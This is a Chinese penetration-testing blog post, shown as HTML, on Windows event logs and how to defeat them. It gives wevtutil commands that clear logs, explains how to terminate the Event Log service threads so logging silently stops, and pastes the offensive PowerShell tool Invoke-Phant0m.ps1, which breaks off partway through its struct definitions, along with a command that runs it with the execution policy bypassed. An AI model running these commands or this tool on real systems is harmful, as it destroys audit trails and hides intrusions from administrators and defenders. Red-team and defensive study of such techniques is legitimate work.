+        <a  class=""
+           href="/%E6%8F%90%E6%9D%83%E4%B9%8BLinux-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/"
+           data-tag="linux,提权"
+           data-author="" >
+            <span class="post-title" title="提权之Linux-环境变量">提权之Linux-环境变量</span>
+            <span class="post-date" title="2020-02-09 11:16:30">2020/02/09</span>
+        </a>
+        
+        <a  class=""
+           href="/%E6%8F%90%E6%9D%83%E4%B9%8Blinux-suid/"
+           data-tag="Linux,提权"
+           data-author="" >
+            <span class="post-title" title="提权之linux-suid">提权之linux-suid</span>
+            <span class="post-date" title="2020-04-07 21:02:38">2020/04/07</span>
+        </a>
+        
+        <a  class=""
+           href="/%E6%8F%90%E6%9D%83%E4%B9%8BLinux/"
+           data-tag="linux,提权"
+           data-author="" >
+            <span class="post-title" title="提权之Linux">提权之Linux</span>
+            <span class="post-date" title="2020-05-24 00:58:53">2020/05/24</span>
+        </a>
+        
+        <a  class=""
+           href="/%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-DLL%E6%B3%A8%E5%85%A5/"
+           data-tag="windows,提权,DLL"
+           data-author="" >
+            <span class="post-title" title="提权之windows-DLL注入">提权之windows-DLL注入</span>
+            <span class="post-date" title="2020-03-23 16:52:18">2020/03/23</span>
+        </a>
+        
+        <a  class=""
+           href="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/"
+           data-tag="漏洞"
+           data-author="" >
+            <span class="post-title" title="文件解析漏洞">文件解析漏洞</span>
+            <span class="post-date" title="2020-01-14 21:35:14">2020/01/14</span>
+        </a>
+        
+        <a  class=""
+           href="/%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-CVE-2018-8120/"
+           data-tag="提权"
+           data-author="" >
+            <span class="post-title" title="提权之windows-CVE-2018-8120">提权之windows-CVE-2018-8120</span>
+            <span class="post-date" title="2020-02-12 12:46:56">2020/02/12</span>
+        </a>
+        
+        <a  class=""
+           href="/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"
+           data-tag="知识"
+           data-author="" >
+            <span class="post-title" title="正则表达式">正则表达式</span>
+            <span class="post-date" title="2019-12-10 21:08:11">2019/12/10</span>
+        </a>
+        
+        <a  class=""
+           href="/%E6%8F%90%E6%9D%83%E4%B9%8BWindows/"
+           data-tag="windows,提权"
+           data-author="" >
+            <span class="post-title" title="提权之Windows">提权之Windows</span>
+            <span class="post-date" title="2020-05-21 21:46:22">2020/05/21</span>
+        </a>
+        
+        <a  class=""
+           href="/%E7%BB%95WAF%E4%B9%8Bsafedog/"
+           data-tag="WAF"
+           data-author="" >
+            <span class="post-title" title="绕WAF之safedog">绕WAF之safedog</span>
+            <span class="post-date" title="2019-12-27 20:28:35">2019/12/27</span>
+        </a>
+        
+        <a  class=""
+           href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"
+           data-tag="信息搜集"
+           data-author="" >
+            <span class="post-title" title="渗透测试之信息搜集">渗透测试之信息搜集</span>
+            <span class="post-date" title="2020-08-25 00:36:08">2020/08/25</span>
+        </a>
+        
+        <a  class=""
+           href="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/"
+           data-tag="工具,内网渗透,端口"
+           data-author="" >
+            <span class="post-title" title="端口转发与隧道技术">端口转发与隧道技术</span>
+            <span class="post-date" title="2020-01-05 02:38:08">2020/01/05</span>
+        </a>
+        
+        <a  class=""
+           href="/%E7%BB%95WAF%E4%B9%8B%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93/"
+           data-tag="WAF"
+           data-author="" >
+            <span class="post-title" title="绕WAF之分块传输">绕WAF之分块传输</span>
+            <span class="post-date" title="2019-12-27 09:24:52">2019/12/27</span>
+        </a>
+        
+        <a  class=""
+           href="/%E8%84%B1%E5%A3%B3/"
+           data-tag="MISC,逆向"
+           data-author="" >
+            <span class="post-title" title="脱壳一">脱壳一</span>
+            <span class="post-date" title="2019-12-26 00:13:05">2019/12/26</span>
+        </a>
+        
+        <a  class=""
+           href="/%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/"
+           data-tag="漏洞,editor"
+           data-author="" >
+            <span class="post-title" title="编辑器漏洞">编辑器漏洞</span>
+            <span class="post-date" title="2020-08-19 12:15:10">2020/08/19</span>
+        </a>
+        
+        <a  class=""
+           href="/Web-CheckList/"
+           data-tag="知识"
+           data-author="" >
+            <span class="post-title" title="Web-CheckList">Web-CheckList</span>
+            <span class="post-date" title="2020-10-28 15:18:44">2020/10/28</span>
+        </a>
+        
+        <a  class=""
+           href="/%E8%84%B1%E5%A3%B3%E4%BA%8C/"
+           data-tag="MISC,逆向"
+           data-author="" >
+            <span class="post-title" title="脱壳二">脱壳二</span>
+            <span class="post-date" title="2020-01-01 15:51:38">2020/01/01</span>
+        </a>
+        
+        <a  class=""
+           href="/%E6%97%A5%E5%BF%97/"
+           data-tag="log"
+           data-author="" >
+            <span class="post-title" title="日志">日志</span>
+            <span class="post-date" title="2020-07-25 22:12:45">2020/07/25</span>
+        </a>
+        
+        <a  class=""
+           href="/%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/"
+           data-tag="漏洞,端口"
+           data-author="" >
+            <span class="post-title" title="漏洞记录">漏洞记录</span>
+            <span class="post-date" title="2020-06-06 21:36:18">2020/06/06</span>
+        </a>
+        
+    </nav>
+</div>
+    </div>
+    <div class="hide-list">
+        <div class="semicircle">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div class="post">
+    <div class="pjax">
+        <article id="post-日志" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">日志</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        
+        <span class="tag">
+            
+            <a class="color4">log</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+        创建时间:<time class="date" title=''>2020-07-25 22:12<br/>
+        更新时间: 2020-08-21 19:57:14
+        </time>
+        
+    </div>
+    <div class="article-meta">
+        
+        
+        <span id="busuanzi_container_page_pv">
+            阅读:<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#windows日志"><span class="toc-text">windows日志</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-text">参考</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Invoke-Phant0m-ps1"><span class="toc-text">Invoke-Phant0m.ps1</span></a></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="windows日志"><a href="#windows日志" class="headerlink" title="windows日志"></a>windows日志</h2><ol>
+<li>控制面板——事件查看器，或者运行——eventvwr.msc（Control Panel\System and Security-View event logs-Windows Logs）</li>
+<li>五类：</li>
+<li><ul>
+<li>应用程序 application</li>
+</ul>
+</li>
+<li><ul>
+<li>安全 security</li>
+</ul>
+</li>
+<li><ul>
+<li>setup</li>
+</ul>
+</li>
+<li><ul>
+<li>系统 system</li>
+</ul>
+</li>
+<li><ul>
+<li>转发事件 </li>
+</ul>
+</li>
+<li><img src="/%E6%97%A5%E5%BF%97/1.png" alt></li>
+</ol>
+<p><strong>清理日志</strong></p>
+<ol>
+<li>wevtutil.exe</li>
+<li>wevtutil.exe gli application #统计日志列表，查询所有日志信息，时间，数量</li>
+<li>wevtutil.exe qe /f:text security #查看指定类型的日志内容</li>
+<li>wevtutil.exe cl application</li>
+<li><img src="/%E6%97%A5%E5%BF%97/2.png" alt></li>
+</ol>
+<p><strong>powershell</strong></p>
+<ol>
+<li>get-winevent #查看所有日志</li>
+<li>get-winevent -filterhashtable @{logname=”application”} #查看应用程序类别下的日志</li>
+<li>get-winevent -filterhashtable @{logname=”security”}</li>
+</ol>
+<p>##　Windows日志的绕过方法<br><strong>绕过原理：</strong></p>
+<pre><code>Windows日志对应于eventlog服务，找到该服务对应的进程svchost.exe，进而筛选出svchost.exe进程中具体实现日志功能的线程，调用TerminateThread结束线程，破坏日志记录功能，由于只结束了实现日志功能的线程，所以Windows Event Log服务没有被破坏，状态仍为正在运行。</code></pre><p><strong>绕过方法</strong></p>
+<pre><code>1、 定位eventlog服务对应进程svchost.exe的pid
+2、 遍历该进程中的所有线程
+3、 判断线程是否满足条件
+Windows Event Log 服务需要调用wevtsvc.dll，完整路径为%WinDir%\System32\wevtsvc.dll
+并且，如果线程调用了wevtsvc.dll，就可以判读该线程实现了日志记录功能
+4、 结束线程
+使用TerminateThread
+5、 恢复方法
+结束进程svchost.exe
+重新开启Windows Event Log 服务：
+net start eventlog</code></pre><p>powershell执行Invoke-Phant0m.ps1脚本后，Windows日志功能失效，无法记录日志</p>
+<pre><code>powershell -executionpolicy bypass -file Invoke-Phant0m.ps1</code></pre><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E6%97%A5%E5%BF%97%E7%9A%84%E5%88%A0%E9%99%A4%E4%B8%8E%E7%BB%95%E8%BF%87/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E6%97%A5%E5%BF%97%E7%9A%84%E5%88%A0%E9%99%A4%E4%B8%8E%E7%BB%95%E8%BF%87/</a></p>
+<h2 id="Invoke-Phant0m-ps1"><a href="#Invoke-Phant0m-ps1" class="headerlink" title="Invoke-Phant0m.ps1"></a>Invoke-Phant0m.ps1</h2><pre><code>function Invoke-Phant0m {
+&lt;#
+.SYNOPSIS
+This script walks thread stacks of Event Log Service process (spesific svchost.exe) and identify
+Event Log Threads to kill Event Log Service Threads. So the system will not be able to collect
+logs and at the same time the Event Log Service will appear to be running. I have made this script
+for two reasons. First, This script will help to Red Teams and Penetration Testers. Second, I
+want to learn Powershell and Low-Level things on Powershell for cyber security field.
+.DESCRIPTION
+This script using Jesse Davis (https://github.com/secabstraction) Get-ProcessTrace.ps1 scripts as an
+infrastructure, https://gist.github.com/secabstraction/508bfd6c0c0809e6d657. Thanks to Ibrahim AKGUL
+(https://twitter.com/Stre4meR) and Onur ALANBEL (https://twitter.com/onuralanbel) for sharing their
+experiences with me.
+.EXAMPLE
+The following example show sample output and usage the script. Script traces the threads of Event Log
+Service process and detect threads. After kill all threads about Event Log Service. Scripts needs
+Administrator rights on the target system.
+PS C:\&gt; Invoke-Phant0m
+        _                 _    ___
+  _ __ | |__   __ _ _ __ | |_ / _ \ _ __ ___
+ | &#39;_ \| &#39;_ \ / _` | &#39;_ \| __| | | | &#39;_ ` _ \
+ | |_) | | | | (_| | | | | |_| |_| | | | | | |
+ | .__/|_| |_|\__,_|_| |_|\__|\___/|_| |_| |_|
+ |_|
+[!] I&#39;m here to blur the line between life and death...
+[*] Enumerating threads of PID: 1000...
+[*] Parsing Event Log Service Threads...
+[+] Thread 1001 Succesfully Killed!&quot;
+[+] Thread 1002 Succesfully Killed!&quot;
+[+] Thread 1003 Succesfully Killed!&quot;
+[+] Thread 1004 Succesfully Killed!&quot;
+[+] All done, you are ready to go!
+.NOTES
+Version: 1.0
+Author : Halil DALABASMAZ (https://github.com/hlldz, https://twitter.com/hlldz)
+#&gt;
+[CmdLetBinding()]
+    Param(
+        [Parameter(Position = 0, ValueFromPipeline = $true)]
+        [String[]]$ComputerName,
+
+        [Parameter(ParameterSetName = &#39;Id&#39;)]
+        [ValidateNotNullOrEmpty()]
+        [Int]$Id = -1
+    )
+
+    $intro = @&#39;
+        _                 _    ___
+  _ __ | |__   __ _ _ __ | |_ / _ \ _ __ ___
+ | &#39;_ \| &#39;_ \ / _` | &#39;_ \| __| | | | &#39;_ ` _ \
+ | |_) | | | | (_| | | | | |_| |_| | | | | | |
+ | .__/|_| |_|\__,_|_| |_|\__|\___/|_| |_| |_|
+ |_|
+&#39;@
+
+    Write-Host $intro -ForegroundColor Cyan
+
+    Write-Host &quot;&quot;
+    Write-Host &quot;[!] I&#39;m here to blur the line between life and death...&quot; -ForegroundColor Cyan
+    Write-Host &quot;&quot;
+
+    $ScriptBlock = {
+        Param (
+            [Parameter()]
+            [String]$Name,
+
+            [Parameter()]
+            [Int]$Id
+        )
+        if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+            Write-Warning &quot;This script should be ran with administrative priviliges.&quot;
+        }
+        $Domain = [AppDomain]::CurrentDomain
+        $DynAssembly = New-Object -TypeName System.Reflection.AssemblyName -ArgumentList (&#39;PowerWalker&#39;)
+        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
+        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule(&#39;InMemoryModule&#39;, $false)
+        $ConstructorInfo = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
+
+        #region STRUCTS
+
+        #region ENUM ProcessorArch
+        $TypeBuilder = $ModuleBuilder.DefineEnum(&#39;ProcessorArch&#39;, &#39;Public&#39;, [UInt16])
+        [void]$TypeBuilder.DefineLiteral(&#39;PROCESSOR_ARCHITECTURE_INTEL&#39;, [UInt16] 0)
+        [void]$TypeBuilder.DefineLiteral(&#39;PROCESSOR_ARCHITECTURE_MIPS&#39;, [UInt16] 0x01)
+        [void]$TypeBuilder.DefineLiteral(&#39;PROCESSOR_ARCHITECTURE_ALPHA&#39;, [UInt16] 0x02)
+        [void]$TypeBuilder.DefineLiteral(&#39;PROCESSOR_ARCHITECTURE_PPC&#39;, [UInt16] 0x03)
+        [void]$TypeBuilder.DefineLiteral(&#39;PROCESSOR_ARCHITECTURE_SHX&#39;, [UInt16] 0x04)
+        [void]$TypeBuilder.DefineLiteral(&#39;PROCESSOR_ARCHITECTURE_ARM&#39;, [UInt16] 0x05)
+        [void]$TypeBuilder.DefineLiteral(&#39;PROCESSOR_ARCHITECTURE_IA64&#39;, [UInt16] 0x06)
+        [void]$TypeBuilder.DefineLiteral(&#39;PROCESSOR_ARCHITECTURE_ALPHA64&#39;, [UInt16] 0x07)
+        [void]$TypeBuilder.DefineLiteral(&#39;PROCESSOR_ARCHITECTURE_AMD64&#39;, [UInt16] 0x09)
+        [void]$TypeBuilder.DefineLiteral(&#39;PROCESSOR_ARCHITECTURE_UNKNOWN&#39;, [UInt16] 0xFFFF)
+        $Global:ProcessorArch = $TypeBuilder.CreateType()
+        #endregion ENUM ProcessorArch
+
+        #region SYSTEM_INFO
+        $Attributes = &#39;AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit&#39;
+        $TypeBuilder = $ModuleBuilder.DefineType(&#39;SYSTEM_INFO&#39;, $Attributes, [ValueType])
+        [void]$TypeBuilder.DefineField(&#39;ProcessorArchitecture&#39;, $ProcessorArch, &#39;Public&#39;)
+        [void]$TypeBuilder.DefineField(&#39;Reserved&#39;, [Int16], &#39;Public&#39;)
+        [void]$TypeBuilder.DefineField(&#39;PageSize&#39;, [Int32], &#39;Public&#39;)
+        [void]$TypeBuilder.DefineField(&#39;MinimumApplicationAddress&#39;, [IntPtr], &#39;Public&#39;)
+        [void]$TypeBuilder.DefineField(&#39;MaximumApplicationAddress&#39;, [IntPtr], &#39;Public&#39;)
+        [void]$TypeBuilder.DefineField(&#39;ActiveProcessorMask&#39;, [IntPtr], &#39;Public&#39;)
+        [void]$TypeBuilder.DefineField(&#39;NumberOfProcessors&#39;, [Int32], &#39;Public&#39;)
+        [void]$TypeBuilder.DefineField(&#39;ProcessorType&#39;, [Int32], &#39;Public&#39;)
+        [void]$TypeBuilder.DefineField(&#39;AllocationGranularity&#39;, [Int32], &#39;Public&#39;)
+        [void]$TypeBuilder.DefineField(&#39;ProcessorLevel&#39;, [Int16], &#39;Public&#39;)
+        [void]$TypeBuilder.DefineField(&#39;ProcessorRevision&#39;, [Int16], &#39;Public&#39;)
+        $Global:SYSTEM_INFO = $TypeBuilder.CreateType()
+        #endregion SYSTEM_INFO
+
+        #region MODULE_INFO
+        $Attributes = &#39;AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit&#39;
+        $TypeBuilder = $ModuleBuilder.DefineType(&#39;MODULE_INFO&#39;, $Attributes, [ValueType], 12)
+        [void]$TypeBuilder.DefineField(&#39;lpBaseOfDll&#39;, [IntPtr], &#39;Public&#39;)
+        [void]$TypeBuilder.DefineField(&#39;SizeOfImage&#39;, [UInt32], &#39;Public&#39;)
+        [void]$TypeBuilder.DefineField(&#39;EntryPoint&#39;, [IntPtr], &#39;Public&#39;)
+        $Global:MODULE_INFO = $TypeBuilder.CreateType()
+        #endregion MODULE_INFO
+
+        #region KDHELP
+        $Attributes = &#39;AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit&#39;
+        $TypeBuilder = $ModuleBuilder.DefineType(&#39;KDHELP&#39;, $Attributes, [ValueType])
+        [void]$TypeBuilder.DefineField(&#39;Thread&#39;, [UInt64], &#39;Public&#39;)
+        [void]$TypeBuilder.DefineField(&#39;ThCallbackStack&#39;, [UInt32], &#39;Public&#39;)
+        [void]$TypeBuilder.DefineField(&#39;ThCallbackBStore&#39;, [UInt32], &#39;Public&#39;)
+        [void]$TypeBuilder.DefineField(&#39;NextCallback&#39;, [UInt32], &#39;Public&#39;)
+        [void]$TypeBuilder.DefineField(&#39;FramePointer&#39;, [UInt32], &#39;Public&#39;)
+        [void]$TypeBuilder.DefineField(&#39;KiCallUserMode&#39;, [UInt32], &#39;Public&#39;)
+        [void]$TypeBuilder.DefineField(&#39;KeUserCallbackDispatcher&#39;, [UInt32], &#39;Public&#39;)
+        [void]$TypeBuilder.DefineField(&#39;SystemRangeStart&#39;, [UInt32], &#39;Public&#39;)
+        [void]$TypeBuilder.DefineField(&#39;KiUserExceptionDispatcher&#39;, [UInt32], &#39;Public&#39;)
+        [void]$TypeBuilder.DefineField(&#39;StackBase&#39;, [UInt32], &#39;Public&#39;)
+        [void]$TypeBuilder.DefineField(&#39;StackLimit&#39;, [UInt32], &#39;Public&#39;)
+        $ReservedField = $TypeBuilder.DefineField(&#39;Reserved&#39;, [UInt64[]], &#39;Public&#39;)
+        $FieldArray = @([Runtime.InteropServices.MarshalAsAttribute].GetField(&#39;SizeConst&#39;))
+        $ConstructorValue = [Runtime.InteropServices.UnmanagedType]::ByValArray
+        $AttribBuilder = New-Object -TypeName System.Reflection.Emit.CustomAttributeBuilder -ArgumentList ($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 5))
+        [void]$ReservedField.SetCustomAttribute($AttribBuilder)
+        $KDHELP = $TypeBuilder.CreateType()
+        #endregion KDHELP
+
+        #region ADDRESS64
+        $Attributes = &#39;AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit&#39;
+        $TypeBuilder = $ModuleBuilder.DefineType(&#39;ADDRESS64&#39;, $Attributes, [ValueType])
+        [void]$TypeBuilder.DefineField(&#39;Offset&#39;, [UInt64], &#39;Public&#39;)
+        [void]$TypeBuilder.DefineField(&#39;Segment&#39;, [UInt32], &#39;Public&#39;)
+        [void]$TypeBuilder.DefineField(&#39;Mode&#39;, [UInt32], &#39;Public&#39;)
+        $Global:ADDRESS64 = $TypeBuilder.CreateType()
+        #endregion ADDRESS64
+
+        #region STACKFRAME64
+        $Attributes = &#39;AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit&#39;
+        $TypeBuilder = $ModuleBuilder.DefineType(&#39;STACKFRAME64&#39;, $Attributes, [ValueType])
+        [void]$TypeBuilder.DefineField(&#39;AddrPC&#39;, $ADDRESS64, &#39;Public&#39;)
+        [void]$TypeBuilder.DefineField(&#39;AddrReturn&#39;, $ADDRESS64, &#39;Public&#39;)
+        [void]$TypeBuilder.DefineField(&#39;AddrFrame&#39;, $ADDRESS64, &#39;Public&#39;)
+        [void]$TypeBuilder.DefineField(&#39;AddrStack&#39;, $ADDRESS64, &#39;Public&#39;)
+        [void]$TypeBuilder.DefineField(&#39;AddrBStore&#39;, $ADDRESS64, &#39;Public&#39;)
+        [void]$TypeBuilder.DefineField(&#39;FuncTableEntry&#39;, [IntPtr], &#39;Public&#39;)
+        [void]$TypeBuilder.DefineField(&#39;Offset&#39;, [UInt64], &#39;Public&#39;)
+        $ParamsField = $TypeBuilder.DefineField(&#39;Params&#39;, [UInt64[]], &#39;Public&#39;)
+        $AttribBuilder = New-Object -TypeName System.Reflection.Emit.CustomAttributeBuilder -ArgumentList ($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 4))
+        [void]$ParamsField.SetCustomAttribute($AttribBuilder)
+        [void]$TypeBuilder.DefineField(&#39;Far&#39;, [Bool], &#39;Public&#39;)
+        [void]$TypeBuilder.DefineField(&#39;Virtual&#39;, [Bool], &#39;Public&#39;)
+        $ReservedField = $TypeBuilder.DefineField(&#39;Reserved&#39;, [UInt64[]], &#39;Public&#39;)
+        $AttribBuilder = New-Object -TypeName System.Reflection.Emit.CustomAttributeBuilder -ArgumentList ($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 3))
+        [void]$ReservedField.SetCustomAttribute($AttribBuilder)
+        [void]$TypeBuilder.DefineField(&#39;KdHelp&#39;, $KDHELP, &#39;Public&#39;)
+        $Global:STACKFRAME64 = $TypeBuilder.CreateType()
+        #endregion STACKFRAME64
+
+        #region IMAGEHLP_SYMBOLW64
+        $Attributes = &#39;AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit&#39;
+        $TypeBuilder = $ModuleBuilder.DefineType(&#39;IMAGEHLP_SYMBOLW64&#39;, $Attributes, [ValueType])
+        [void]$TypeBuilder.DefineField(&#39;SizeOfStruct&#39;, [UInt32], &#39;Public&#39;)
+        [void]$TypeBuilder.DefineField(&#39;Address&#39;, [UInt64], &#39;Public&#39;)
+        [void]$TypeBuilder.DefineField(&#39;Size&#39;, [UInt32], &#39;Public&#39;)
+        [void]$TypeBuilder.DefineField(&#39;Flags&#39;, [UInt32], &#39;Public&#39;)
+        [void]$TypeBuilder.DefineField(&#39;MaxNameLength&#39;, [UInt32], &#39;Public&#39;)
+        $NameField = $TypeBuilder.DefineField(&#39;Name&#39;, [Char[]], &#39;Public&#39;)
+        $AttribBuilder = New-Object -TypeName System.Reflection.Emit.CustomAttributeBuilder -ArgumentList ($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 33))
+        [void]$NameField.SetCustomAttribute($AttribBuilder)
+        $Global:IMAGEHLP_SYMBOLW64 = $TypeBuilder.CreateType()
+        #endregion IMAGEHLP_SYMBOLW64
+
+        #region FLOAT128
+        $Attributes = &#39;AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit&#39;
+        $TypeBuilder = $ModuleBuilder.DefineType(&#39;FLOAT128&#39;, $Attributes, [ValueType])
+        [void]$TypeBuilder.DefineField(&#39;LowPart&#39;, [Int64], &#39;Public&#39;)
+        [void]$TypeBuilder.DefineField(&#39;HighPart&#39;, [Int64], &#39;Public&#39;)
+        $FLOAT128 = $TypeBuilder.CreateType()
+        #endregion FLOAT128
+
+        #region FLOATING_SAVE_AREA
+        $Attributes = &#39;AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit&#39;
+        $TypeBuilder = $ModuleBuilder.DefineType(&#39;FLOATING_SAVE_AREA&#39;, $Attributes, [ValueType])
+        [void]$TypeBuilder.DefineField(&#39;ControlWord&#39;, [UInt32], &#39;Public&#39;)
+        [void]$TypeBuilder.DefineField(&#39;StatusWord&#39;, [UInt32], &#39;Public&#39;)
+        [void]$TypeBuilder.DefineField(&#39;TagWord&#39;, [UInt32], &#39;Public&#39;)
+        [void]$TypeBuilder.DefineField(&#39;ErrorOffset&#39;, [UInt32], &#39;Public&#39;)
+        [void]$TypeBuilder.DefineField(&#39;ErrorSelector&#39;, [UInt32], &#39;Public&#39;)
+        [void]$TypeBuilder.DefineField(&#39;DataOffset&#39;, [UInt32], &#39;Public&#39;)
+        [void]$TypeBuilder.DefineField(&#39;DataSelector&#39;, [UInt32], &#39;Public&#39;)
+        $RegisterAreaField = $TypeBuilder.DefineField(&#39;RegisterArea&#39;, [Byte[]], &#39;Public&#39;)
+        $AttribBuilder = New-Object -TypeName System.Reflection.Emit.CustomAttributeBuilder -ArgumentList ($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 80))
+        [void]$RegisterAreaField.SetCustomAttribute($AttribBuilder)
+        [void]$TypeBuilder.DefineField(&#39;Cr0NpxState&#39;, [UInt32], &#39;Public&#39;)
+        $FLOATING_SAVE_AREA = $TypeBuilder.CreateType()
+        #endregion FLOATING_SAVE_AREA
+
+        #region X86_CONTEXT
+        $Attributes = &#39;AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit&#39;
+        $TypeBuilder = $ModuleBuilder.DefineType(&#39;X86_CONTEXT&#39;, $Attributes, [ValueType])
+        [void]$TypeBuilder.DefineField(&#39;ContextFlags&#39;, [UInt32], &#39;Public&#39;)
+        [void]$TypeBuilder.DefineField(&#39;Dr0&#39;, [UInt32], &#39;Public&#39;)
+        [void]$TypeBuilder.DefineField(&#39;Dr1&#39;, [UInt32], &#39;Public&#39;)
+        [void]$TypeBuilder.DefineField(&#39;Dr2&#39;, [UInt32], &#39;Public&#39;)
+        [void]$TypeBuilder.DefineField(&#39;Dr3&#39;, [UInt32], &#39;Public&#39;)
+        [void]$TypeBuilder.DefineField(&#39;Dr6&#39;, [UInt32], &#39;Public&#39;)
+        [void]$TypeBuilder.DefineField(&#39;Dr7&#39;, [UInt32], &#39;Public&#39;)
+        [void]$TypeBuilder.DefineField(&#39;FloatSave&#39;, $FLOATING_SAVE_AREA, &#39;Public&#39;)
+        [void]$TypeBuilder.DefineField(&#39;SegGs&#39;, [UInt32], &#39;Public&#39;)
+        [void]$TypeBuilder.DefineField(&#39;SegFs&#39;, [UInt32], &#39;Public&#39;)
+        [void]$TypeBuilder.DefineField(&#39;SegEs&#39;, [UInt32], &#39;Public&#39;)
+        [void]$TypeBuilder.DefineField(&#39;SegDs&#39;, [UInt32], &#39;Public&#39;)
+        [void]$TypeBuilder.DefineField(&#39;Edi&#39;, [UInt32], &#39;Public&#39;)
+        [void]$TypeBuilder.DefineField(&#39;Esi&#39;, [UInt32], &#39;Public&#39;)
+        [void]$TypeBuilder.DefineField(&#39;Ebx&#39;, [UInt32], &#39;Public&#39;)
+        [void]$TypeBuilder.DefineField(&#39;Edx&#39;, [UInt32], &#39;Public&#39;)
+        [void]$TypeBuilder.DefineField(&#39;Ecx&#39;, [UInt32], &#39;Public&#39;)
+        [void]$TypeBuilder.DefineField(&#39;Eax&#39;, [UInt32], &#39;Public&#39;)
+        [void]$TypeBuilder.DefineField(&#39;Ebp&#39;, [UInt32], &#39;Public&#39;)
+        [void]$TypeBuilder.DefineField(&#39;Eip&#39;, [UInt32], &#39;Public&#39;)
+        [void]$TypeBuilder.DefineField(&#39;SegCs&#39;, [UInt32], &#39;Public&#39;)
+        [void]$TypeBuilder.DefineField(&#39;EFlags&#39;, [UInt32], &#39;Public&#39;)
+        [void]$TypeBuilder.DefineField(&#39;Esp&#39;, [UInt32], &#39;Public&#39;)
+        [void]$TypeBuilder.DefineField(&#39;SegSs&#39;, [UInt32], &#39;Public&#39;)
+        $ExtendedRegistersField = $TypeBuilder.DefineField(&#39;ExtendedRegisters&#39;, [Byte[]], &#39;Public&#39;)
+        $AttribBuilder = New-Object -TypeName System.Reflection.Emit.CustomAttributeBuilder -ArgumentList ($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 512))
+        [void]$ExtendedRegistersField.SetCustomAttribute($AttribBuilder)
+        $Global:X86_CONTEXT = $TypeBuilder.CreateType()
+        #endregion X86_CONTEXT
+
+        #region AMD64_CONTEXT
+        $Attributes = &#39;AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit&#39;
+        $TypeBuilder = $ModuleBuilder.DefineType(&#39;AMD64_CONTEXT&#39;, $Attributes, [ValueType])
+        ($TypeBuilder.DefineField(&#39;P1Home&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x0)
+        ($TypeBuilder.DefineField(&#39;P2Home&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x8)
+        ($TypeBuilder.DefineField(&#39;P3Home&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x10)
+        ($TypeBuilder.DefineField(&#39;P4Home&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x18)
+        ($TypeBuilder.DefineField(&#39;P5Home&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x20)
+        ($TypeBuilder.DefineField(&#39;P6Home&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x28)
+        ($TypeBuilder.DefineField(&#39;ContextFlags&#39;, [UInt32], &#39;Public&#39;)).SetOffset(0x30)
+        ($TypeBuilder.DefineField(&#39;MxCsr&#39;, [UInt32], &#39;Public&#39;)).SetOffset(0x34)
